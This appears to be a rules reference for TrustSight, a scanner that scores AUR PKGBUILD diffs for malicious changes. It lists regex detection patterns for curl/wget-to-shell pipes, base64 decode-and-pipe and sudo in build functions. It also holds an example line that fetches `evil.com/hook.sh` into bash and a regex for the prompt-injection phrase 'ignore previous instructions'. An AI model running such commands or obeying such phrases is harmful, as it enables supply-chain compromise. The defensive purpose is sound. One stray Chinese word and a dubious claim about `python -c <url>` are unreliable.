# Rules Reference

TrustSight uses rules to detect structural signals in PKGBUILD diffs. Each rule contributes to the final score based on its severity weight, match target, and scope.

## How scoring uses rules

The final score is computed from four signal sources. Rules are the primary source (Tier A):

**Score formula:**

```text
base = sum(severity_weight for each fired rule)
base += source_bucket_modifiers (Tier B)
base += novelty_weights scaled by maturity (Tier C)
base -= verification_evidence (Tier D)
base -= pinning_discounts
final = clamp(base, 0, 100)
```

If a FATAL rule fires, the score is immediately set to 100 regardless of all other signals.

### How severity weight maps to risk

Each severity level carries a weight that reflects its information value: how often does this signal fire on benign packages versus malicious ones?

| Severity | Weight | Fire rate on benign corpus | Meaning |
|----------|--------|---------------------------|---------|
| FATAL | 0 (hard-stop) | Never | Score immediately set to 100. Package is attempting to deceive the reviewer. |
| CRITICAL | 40 | Rare | Almost certainly malicious if triggered. curl pipe bash, sudo in functions. |
| HIGH | 25 | Low | Strong signal. Checksum manipulation, unexpected downloads. |
| MEDIUM | 15 | Moderate | Notable but not definitive. Install file changes. |
| LOW | 5 | High | Weak signal. Demoted from higher severity if corpus fire rate exceeds 30%. |
| INFO | 0 | Variable | Recorded for audit trail only. No score contribution. |

A CRITICAL rule on its own (weight 40) pushes a package into the FLAGGED range (21+). A single HIGH rule (weight 25) does the same. Two MEDIUM rules (15 + 15 = 30) also reach FLAGGED. The 20-point CLEAN threshold means any single CRITICAL or HIGH rule, or any combination of lower-severity rules summing above 20, will flag the package.

### How match_target selects what the rule sees

PKGBUILDs encode meaning at two levels. The text of the file declares structure (variables, arrays, function boundaries). The resolved values of those variables determine what actually runs. Rules target one or the other:

- **`resolved` target**: the rule pattern is applied to the post-variable-expansion value of each function body and source array. This catches patterns hidden behind variables: `curl $url | $shell` in the diff becomes `curl https://evil.com/hook.sh | bash` after resolution.
- **`raw_line` target**: the rule pattern is applied to the literal diff line with the `+`/`-` prefix stripped. This catches patterns in the PKGBUILD structure itself: a `sha256sums=('SKIP')` declaration or a unicode bidi override character.

Some patterns are only visible at the raw level (structure, declarations, unicode characters). Some are only meaningful after resolution (actual URLs, command strings). The two-target design covers both surfaces.

### How scope reduces false positives

Scope restricts which lines a `raw_line` rule checks. Without scope, a rule like R009 (`sudo`) would fire on every line containing the word `sudo`, including comments (`# sudo is required`), messages (`echo "sudo needed"`), and top-level declarations (`groups=('sudo')`). The `function_body` scope restricts matching to lines inside `build()`, `package()`, `check()`, and similar functions where commands actually execute.

Scope is set per-rule in `rules.toml`. When absent, the rule matches all lines. Scope has no effect on `resolved`-target rules because resolution already strips comments and top-level declarations.

### How rules map to evidence tiers

| Tier | Rule sources | What they measure |
|------|-------------|-------------------|
| A (Structural) | R001 to R013, C001 to C003 | Direct pattern matching against PKGBUILD commands and structure |
| B (Priors/Context) | Source bucket classification | Domain reputation of new URLs (not a rule, but a scoring input) |
| C (History/Novelty) | URL and maintainer novelty | First-seen signals from the local database |
| D (Verification) | Checksum, PGP, GPG presence | Cryptographic integrity metadata (subtractive) |

Rules only contribute to Tier A. Tiers B, C, and D are computed independently and added to the score alongside the rule contributions.

---

## R-series (TOML-configurable detection rules) {#r-series}

Defined in `~/.config/trustsight/rules.toml`. Loaded at runtime via `load_rules()` in `src/trustsight/config.py:290`.

Each rule supports these fields:

| Field | Type | Description |
|-------|------|-------------|
| `id` | `string` | Rule identifier (`R001`–`R013`). |
| `name` | `string` | Human-readable name. |
| `pattern` | `string` | Python regex applied to the match target. |
| `severity` | `string` | `FATAL`, `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, or `INFO`. |
| `category` | `string` | Semantic category (`network_execution`, `obfuscation`, `installer`, `privilege`, `network_usage`, `injection`, `unicode`, `integrity`). |
| `match_target` | `string` | `"resolved"` : apply to variable-resolved command strings after tokenization. `"raw_line"` : apply to raw diff lines after stripping the `+`/`-` prefix. |
| `scope` | `list[string]` | (Optional, `raw_line` only) Restrict matching to specific line contexts: `["function_body"]`, `["message"]`, `["other"]`. When absent, matches all lines. |

### R001: Remote Script Execution {#r001}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `curl.*\| *(?:/bin/)?(?:bash\|sh\|python\|zsh\|dash\|busybox\s+sh\|source\s+/dev/stdin)`
- **Description:** Detects `curl | bash`, `curl | sh`, and variants including `python`, `zsh`, `dash`, `busybox sh`, and `source /dev/stdin`. This is the most common careless malice pattern in AUR PKGBUILDs: downloading a script and piping it directly to a shell without verification.

### R002: Wget Pipe to Shell {#r002}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `wget.*\| *(?:/bin/)?(?:bash\|sh\|python\|zsh\|dash\|busybox\s+sh\|source\s+/dev/stdin)`
- **Description:** Same as R001 but for `wget`. Separate rule per tool to allow per-tool tuning.

### R003: Base64 Decode and Execute {#r003}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `obfuscation`
- **Pattern:** `base64.*(?:-d\|--decode).*\|`
- **Description:** Detects `base64 -d |` and `base64 --decode |` piped to execution. Base64-encoded scripts are a common obfuscation technique to hide malicious commands from casual review.

### R004: Checksum Disabled {#r004}

- **Target:** programmatic (not TOML-configurable)
- **Severity:** HIGH (weight 25), downgraded to INFO (weight 0) if justified
- **Category:** `integrity`
- **Condition:** Fires when `sha256sums=SKIP` appears in the diff.
- **Justification:** Severity is downgraded to INFO if the diff contains a VCS source (`git+https://`, `.git`), a signature file (`.sig`, `.asc`), `validpgpkeys` declaration, or DKMS reference. Justification checked via `is_skip_justified()` in `src/trustsight/differ.py:52`.
- **Note:** Hard-coded in `src/trustsight/analysis.py:88`. Cannot be disabled through `rules.toml` because checksum integrity is foundational to the scoring model.

### R005: Checksum Emptied {#r005}

- **Target:** programmatic (not TOML-configurable)
- **Severity:** HIGH (weight 25)
- **Category:** `integrity`
- **Condition:** Fires when `sha256sums=()` appears in the diff (array set to empty).
- **Note:** Hard-coded in `src/trustsight/analysis.py:99`. Cannot be disabled through `rules.toml`.

### R006: Insecure Download Protocol {#r006}

- **Target:** `resolved`
- **Severity:** LOW (weight 5)
- **Category:** `network_execution`
- **Pattern:** `https?://.*\.tar\.gz.*\|`
- **Description:** Detects `tar.gz` piped to execution (e.g. `curl ... tar.gz | tar -x`). Originally classified as HIGH/25; demoted to LOW/5 after corpus analysis showed a fire rate above 30%, making it a census signal rather than a useful anomaly.

### R007: Install File Modification {#r007}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `installer`
- **Pattern:** `\+.*\.install.*`
- **Scope:** All lines (no function-body restriction)
- **Description:** Fires when a `.install` file is added or modified in the diff. Install scripts run with root privileges and are a common vector for persistent backdoors.

### R008: Unexpected File Download {#r008}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network_execution`
- **Pattern:** `\b(python\|ruby\|perl)\s+-c\s+https?://`
- **Description:** Detects language runtimes downloading scripts from URLs: `python -c <url>`, `ruby -c <url>`, `perl -c <url>`. An unusual pattern that indicates a runtime fetching and executing code from a remote server.

### R009: Privilege Escalation {#r009}

- **Target:** `raw_line`
- **Severity:** CRITICAL (weight 40)
- **Category:** `privilege`
- **Pattern:** `\bsudo\b`
- **Scope:** `["function_body"]` only
- **Description:** Detects `sudo` inside function bodies. Does not fire in comments, messages (`echo`, `printf`, `note`), or top-level declarations. Scope restriction prevents false positives from `groups=('sudo')` or `echo "sudo required"`.

### R010: Uses curl in PKGBUILD {#r010}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network_usage`
- **Pattern:** `\bcurl\s`
- **Scope:** `["function_body"]` only
- **Description:** Detects `curl` commands inside function bodies. Does not fire in comments or messages. Low severity because curl is a legitimate build tool; the presence alone is not suspicious, but combined with other signals it adds context.

### R011: Uses wget in PKGBUILD {#r011}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network_usage`
- **Pattern:** `\bwget\s`
- **Scope:** `["function_body"]` only
- **Description:** Same rationale as R010 but for `wget`. Separate rule per tool.

### R012: LLM Prompt Injection {#r012}

- **Target:** `resolved`
- **Severity:** FATAL (hard-stop at 100, weight 0)
- **Category:** `injection`
- **Pattern:** `ignore\s+(?:all\s+)?previous\s+(?:instructions\|commands\|input)`
- **Description:** Detects prompt-injection phrases in resolved strings. This is a **tripwire rule**: recall is 17% on the benchmark corpus. When it fires, the package is almost certainly malicious. When it does not, nothing can be concluded. Score hard-stops at 100 regardless of other signals.
- **Note:** The primary defense against prompt injection is the verdict-integrity assertions in the LLM translation stage, not this rule. Low recall is intentional and acceptable.

### R013: Unicode Bidi Override {#r013}

- **Target:** `raw_line`
- **Severity:** FATAL (hard-stop at 100, weight 0)
- **Category:** `unicode`
- **Pattern:** `[\u202A-\u202E\u2066-\u2069\u200B-\u200D\uFEFF]`
- **Description:** Detects unicode bidi override characters, zero-width spaces (U+200B to U+200D), BOM (U+FEFF), and directional formatting characters (U+202A to U+202E, U+2066 to U+2069). Recall is 88% on the benchmark corpus. These characters can make displayed text differ from executed code, enabling visually隐蔽 attacks.
- **Note:** Score hard-stops at 100 regardless of other signals.

### Severity weights

Configured in `config.toml` `[severity_weights]`:

| Severity | Weight |
|----------|--------|
| FATAL | 0 (hard-stop score at 100) |
| CRITICAL | 40 |
| HIGH | 25 |
| MEDIUM | 15 |
| LOW | 5 |
| INFO | 0 |

### FATAL rules {#fatal-rules}

R012 and R013 are FATAL. They contribute **0 weight** to the running total but immediately set `final_score = 100` and risk level `"Critical"`. No other rules are evaluated for weight contribution after a FATAL fires; the short-circuit is in `calculate_score()` at `src/trustsight/scoring.py:87`.

---

## C-series (code, structural rules) {#c-series-c001c003}

Hard-coded in `src/trustsight/analysis.py:110–140`. Not configurable via TOML. Fire based on structural comparisons between the diff and the post-diff state. All C-series comparisons use `_pkgver_changed_in_diff()` from `src/trustsight/analysis.py:30` to detect `pkgver=` value changes.

### C001: Checksum Changed Without Source Change With Stable Version {#c001}

- **Severity:** HIGH (weight 25)
- **Condition:** `sha256sums` value changed (added or modified), **no** source URLs were added or removed, **and** `pkgver` did not change.
- **Description:** A checksum changed with no corresponding version or source change is anomalous. It suggests the tarball content changed without an upstream version bump, which is a red flag for supply-chain compromise.

### C002: Checksum Updated With Version Bump {#c002}

- **Severity:** INFO (weight 0)
- **Condition:** `sha256sums` value changed (added or modified), **no** source URLs were added or removed, **and** `pkgver` did change.
- **Description:** Normal during routine version bumps. Recorded for audit trail; contributes no weight.

### C003: Source URL Changed Without Version Bump {#c003}

- **Severity:** INFO (weight 0)
- **Condition:** Source URLs were both added **and** removed (the sets differ) **and** `pkgver` did not change.
- **Description:** Source URLs swapped without a version bump is noteworthy but not necessarily malicious. Recorded for audit trail; contributes no weight.

---

## Benchmark performance

Measured against the TrustSight test corpus (267 tests).

| Rule | Recall | Notes |
|------|--------|-------|
| CRITICAL class (all) | 100 % | Every CRITICAL-class sample detected. |
| R012 (prompt injection) | 17 % | Tripwire; catches obvious patterns only. Low recall is intentional. |
| R013 (unicode bidi) | 88 % | Misses some bidi variants. |
| Benign zero-rate | 81.5 % | Percentage of benign diffs scoring 0. |
| Benign p95 | 20 | 95th percentile score on benign corpus. |
| CRITICAL p5 | 40 | 5th percentile score on CRITICAL-class corpus. |
